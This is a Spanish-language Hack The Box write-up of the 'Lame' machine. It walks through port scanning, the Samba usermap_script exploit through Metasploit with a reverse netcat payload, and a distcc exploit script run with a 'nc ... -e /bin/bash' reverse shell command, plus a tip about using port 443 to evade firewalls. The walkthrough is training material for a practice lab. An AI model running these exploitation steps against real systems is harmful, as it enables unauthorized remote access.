---
layout: single
title: Lame - Hack The Box
excerpt: "Lame es una rápida máquina que puede explotarse de diversas maneras, de forma automática a través de metasploit o manual (OSCP Style). Se resolverá de
manera manual explotando una vulnerabilidad en el servicio Dist. Y de manera automática mediante metasploit el servicio SMB que también resulta ser vulnerable."
date: 2021-09-09
classes: wide
header:
  teaser: /assets/images/htb-writeup-lame/lame_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:
  - metasploit
  - oscp style
  - samba
  - ftp
  - easy
---

*NOTA: A lo largo del artículo hago uso de diferentes variables como `<ip_address>, <ip_target>`... Estas variables hacen referencia a:*

- **ip_address**: Tu dirección IP
- **ip_target**: La dirección IP de tu víctima

![](/assets/images/htb-writeup-lame/lame_logo.png)

Lame es una rápida máquina que puede explotarse de diversas maneras, de forma automática a través de metasploit o manual (OSCP Style). Se resolverá de
manera manual explotando una vulnerabilidad en el servicio Dist. Y de manera automática mediante metasploit el servicio SMB que también resulta ser vulnerable.

## Escaneo de puertos

Lo primero es lanzar un escáner para averiguar que puertos están abiertos por TCP:

``
nmap -p- <ip_address> --open -T5 -v -n
``

El resultado es el siguiente:

```
# Nmap 7.91 scan initiated Tue Sep  7 23:00:44 2021 as: nmap -p- -T5 -v -n -Pn -oN allPorts 10.10.10.3
Nmap scan report for 10.10.10.3
Host is up (0.059s latency).
Not shown: 65530 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd

Read data files from: /usr/bin/../share/nmap
# Nmap done at Tue Sep  7 23:04:07 2021 -- 1 IP address (1 host up) scanned in 203.39 seconds
```

Como se puede ver, hay puertos abiertos con servicios conocidos, FTP, SSH, SMB... Quizás el no tan conocido es distcc. Para averiguar más sobre estos puertos,
voy a lanzar otro escaneo sobre estos puertos, tratando de obtener información más concreta con scripts básicos de enumeración.

``nmap -sC -sV -p21,22,139,445,3632 <ip_address> -oN targeted``

El resultado es el siguiente:

```
# Nmap 7.91 scan initiated Tue Sep  7 23:07:54 2021 as: nmap -sC -sV -p21,22,139,445,3632 -Pn -oN targeted 10.10.10.3
Nmap scan report for 10.10.10.3
Host is up (0.032s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.17
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h09m38s, deviation: 2h49m45s, median: 9m35s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2021-09-07T17:17:47-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Sep  7 23:08:46 2021 -- 1 IP address (1 host up) scanned in 52.50 seconds
```

## Vulnerabilidad en FTP

Rápidamente me doy cuenta de que FTP está corriendo una versión del servicio vulnerable y permite el registro anónimo. Nos conectamos via FTP a la dirección
IP proporcionada:

```ftp 10.10.10.3```

Con un `ls -la` tratamos de mostrar directorios y archivos ocultos, además de los permisos que tienen, pero no parece haber archivos. Así que abandono la idea de que
hubiese algo que nos ayudase en la incursión.

Como he mencionado antes, el puerto está corriendo un servicio vulnerable de FTP. Así que mediante la herramienta `searchsploit` busco su vulnerabilidad.

```
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution                                                                                                                                                                  | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                                                     | unix/remote/17491.rb
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Descargo el exploit `searchsploit -m 49757` y trato de ejecutarlo... Evitaré el desenlace de este haciendo un pequeño spoiler, no funcionará. Esta vulnerabilidad lo que
hace es explotar una backdoor maliciosa que se introdujo en el archivo de instalación de dicho servicio. Entonces, por que no funciona? Es probable que mediante
**IP TABLES** se haya definido una regla a nivel de firewall que evite este tipo de conexión. Así que dejando fuera de juego este servicio... Continuo la búsqueda de
vulnerabilidades.

## Vulnerabilidad en SAMBA

Una vez más encontramos otro servicio vulnerable, SAMBA en su versión `3.0.20`. Haciendo uso de `searchsploit`, busco una vulnerabilidad en este servicio:

`searchsploit samba 3.0.20`

```
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                                                                                                                     | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                                                                                           | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                                                                                                                                                      | linux/remote/7701.txt
Samba < 3.0.20 - Remote Heap Overflow                                                                                                                                                                      | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                                                                                                              | linux_x86/dos/36741.py
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Hay varias vulnerabilidades, pero útiles para la intrusión, solamente la segunda, si os fijais, entre paréntesis aparece la palabra "Metasploit", eso significa que
ese script en Ruby puede ejecutarse única y exclusivamente en Metasploit. Esto no quiere decir que no se pueda explotar la vulnerabilidad sin Metasploit.

### Explotando SAMBA con Metasploit

Con Metasploit la vida es mucho más sencilla, te evitas prácticamente todo el trabajo duro, así que procedamos a ello.

Ejecutamos Metasploit mediante el comando `msfconsole`, ahora tendremos que definir dos parámetros:

  - Exploit
  - Payload

Para definir el *exploit* a usar sencillamente buscaremos nuestra vulnerabilidad con `search`:

`msf6 > search samba 3.0.20`

```
Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script

msf6 > 
```

`msf6 > use exploit/multi/samba/usermap_script`

Bien, ya tenemos nuestro exploit, ahora queda configurarlo mediante `show options`:

```
Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.0.114    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

`msf6 exploit(multi/samba/usermap_script) > set RHOST=<ip_target>`
`msf6 exploit(multi/samba/usermap_script) > set LHOST=<ip_address>`
`msf6 exploit(multi/samba/usermap_script) > set LPORT=443`

Ya hemos definido el exploit, pero antes de pasar a definir el payload, quiero explicar el por qué usar el puerto 443. El puerto 443 se utiliza para conexiones
seguras, aunque puedes usar el puerto que quieras (siempre que no esté en uso), recomiendo usar el 443 aún sin ser una auditoría real. Esto es debido a que los
firewalls acostumbran a filtrar las conexiones entrantes, también las salientes, pero es más probable que al ver una conexión segura evites al firewall, ya que no
detectará nada extraño.
  

  
Ahora sí, definamos el payload:

`msf6 exploit(multi/samba/usermap_script) > show payloads`

```
Compatible Payloads
===================

   #   Name                                        Disclosure Date  Rank    Check  Description
   -   ----                                        ---------------  ----    -----  -----------
   0   payload/cmd/unix/bind_awk                                    normal  No     Unix Command Shell, Bind TCP (via AWK)
   1   payload/cmd/unix/bind_busybox_telnetd                        normal  No     Unix Command Shell, Bind TCP (via BusyBox telnetd)
   2   payload/cmd/unix/bind_inetd                                  normal  No     Unix Command Shell, Bind TCP (inetd)
   3   payload/cmd/unix/bind_jjs                                    normal  No     Unix Command Shell, Bind TCP (via jjs)
   4   payload/cmd/unix/bind_lua                                    normal  No     Unix Command Shell, Bind TCP (via Lua)
   5   payload/cmd/unix/bind_netcat                                 normal  No     Unix Command Shell, Bind TCP (via netcat)
   6   payload/cmd/unix/bind_netcat_gaping                          normal  No     Unix Command Shell, Bind TCP (via netcat -e)
   7   payload/cmd/unix/bind_netcat_gaping_ipv6                     normal  No     Unix Command Shell, Bind TCP (via netcat -e) IPv6
   8   payload/cmd/unix/bind_perl                                   normal  No     Unix Command Shell, Bind TCP (via Perl)
   9   payload/cmd/unix/bind_perl_ipv6                              normal  No     Unix Command Shell, Bind TCP (via perl) IPv6
   10  payload/cmd/unix/bind_r                                      normal  No     Unix Command Shell, Bind TCP (via R)
   11  payload/cmd/unix/bind_ruby                                   normal  No     Unix Command Shell, Bind TCP (via Ruby)
   12  payload/cmd/unix/bind_ruby_ipv6                              normal  No     Unix Command Shell, Bind TCP (via Ruby) IPv6
   13  payload/cmd/unix/bind_socat_udp                              normal  No     Unix Command Shell, Bind UDP (via socat)
   14  payload/cmd/unix/bind_zsh                                    normal  No     Unix Command Shell, Bind TCP (via Zsh)
   15  payload/cmd/unix/generic                                     normal  No     Unix Command, Generic Command Execution
   16  payload/cmd/unix/pingback_bind                               normal  No     Unix Command Shell, Pingback Bind TCP (via netcat)
   17  payload/cmd/unix/pingback_reverse                            normal  No     Unix Command Shell, Pingback Reverse TCP (via netcat)
   18  payload/cmd/unix/reverse                                     normal  No     Unix Command Shell, Double Reverse TCP (telnet)
   19  payload/cmd/unix/reverse_awk                                 normal  No     Unix Command Shell, Reverse TCP (via AWK)
   20  payload/cmd/unix/reverse_bash_telnet_ssl                     normal  No     Unix Command Shell, Reverse TCP SSL (telnet)
   21  payload/cmd/unix/reverse_jjs                                 normal  No     Unix Command Shell, Reverse TCP (via jjs)
   22  payload/cmd/unix/reverse_ksh                                 normal  No     Unix Command Shell, Reverse TCP (via Ksh)
   23  payload/cmd/unix/reverse_lua                                 normal  No     Unix Command Shell, Reverse TCP (via Lua)
   24  payload/cmd/unix/reverse_ncat_ssl                            normal  No     Unix Command Shell, Reverse TCP (via ncat)
   25  payload/cmd/unix/reverse_netcat                              normal  No     Unix Command Shell, Reverse TCP (via netcat)
   26  payload/cmd/unix/reverse_netcat_gaping                       normal  No     Unix Command Shell, Reverse TCP (via netcat -e)
   27  payload/cmd/unix/reverse_openssl                             normal  No     Unix Command Shell, Double Reverse TCP SSL (openssl)
   28  payload/cmd/unix/reverse_perl                                normal  No     Unix Command Shell, Reverse TCP (via Perl)
   29  payload/cmd/unix/reverse_perl_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL (via perl)
   30  payload/cmd/unix/reverse_php_ssl                             normal  No     Unix Command Shell, Reverse TCP SSL (via php)
   31  payload/cmd/unix/reverse_python                              normal  No     Unix Command Shell, Reverse TCP (via Python)
   32  payload/cmd/unix/reverse_python_ssl                          normal  No     Unix Command Shell, Reverse TCP SSL (via python)
   33  payload/cmd/unix/reverse_r                                   normal  No     Unix Command Shell, Reverse TCP (via R)
   34  payload/cmd/unix/reverse_ruby                                normal  No     Unix Command Shell, Reverse TCP (via Ruby)
   35  payload/cmd/unix/reverse_ruby_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL (via Ruby)
   36  payload/cmd/unix/reverse_socat_udp                           normal  No     Unix Command Shell, Reverse UDP (via socat)
   37  payload/cmd/unix/reverse_ssh                                 normal  No     Unix Command Shell, Reverse TCP SSH
   38  payload/cmd/unix/reverse_ssl_double_telnet                   normal  No     Unix Command Shell, Double Reverse TCP SSL (telnet)
   39  payload/cmd/unix/reverse_tclsh                               normal  No     Unix Command Shell, Reverse TCP (via Tclsh)
   40  payload/cmd/unix/reverse_zsh                                 normal  No     Unix Command Shell, Reverse TCP (via Zsh)
```

`msf6 exploit(multi/samba/usermap_script) > set payload/cmd/unix/reverse_netcat`

Y ahora a esperar la magia:

![](/assets/images/htb-writeup-lame/13.PNG)
  
Con muy poco seríamos root. Evitando hacer una escalada de privilegios manual.

## Vulnerabilidad en DISTCC (OSCP Style)

Finalmente mediante vulnerabilidad distcc, es realmente sencillo, mediante `searchsploit`, buscamos la vulnerabilidad de nuestro servicio.

`searchsploit distcc`
  
```
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
DistCC Daemon - Command Execution (Metasploit)                                                                                                                                                             | multiple/remote/9915.rb
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Nos indica que para poder explotar esta vulnerabilidad la única manera de hacerlo es mediante Metasploit, pero en certificados de renombre como el OSCP, está prohibido
el uso de herramientas automáticas, así que habrá que buscar otra manera de explotar esta vulnerabilidad. Con una rápida búsqueda en Internet, ya tenemos scripts para
realizar el ataque.

![](/assets/images/htb-writeup-lame/16.PNG)
  
Investigo el código de uno de los scripts y montamos el script:
  
![](/assets/images/htb-writeup-lame/17.PNG)

```
┌──(blacksheep4㉿bluedragon)-[~/Escritorio/HTB/Lame]
└─$ nc -nlvp 1403                                   
listening on [any] 1403 ...  

```
  
Por otro lado ejecutamos el script descargado:

`chmod +x distcc.py`
`./distcc.py -t <ip_target> -p 3632 -c "nc <ip_address 1403 -e /bin/bash>"`

Ejecutando este script estamos entablando una Reverse Shell para obtener RCE (Remote Code Execution) / Ejecución Remota de Comandos.
  
![](/assets/images/htb-writeup-lame/19.PNG)

Habriamos accedido directamente al servidor! Pudiendo localizar la flag de usuario.
![](/assets/images/htb-writeup-lame/20.PNG)
  
La escalada de privilegios es mediante SUID. Hay un binario: nmap, al ser una versión antigua cuenta con el modo interactivo, pudiendo hacer uso de este para escalar
privilegios. No lo comento por que por razones que desconozco fue imposible para mi llegar a root de esta manera. Pero en inicio es una forma de llegar a root. :)  
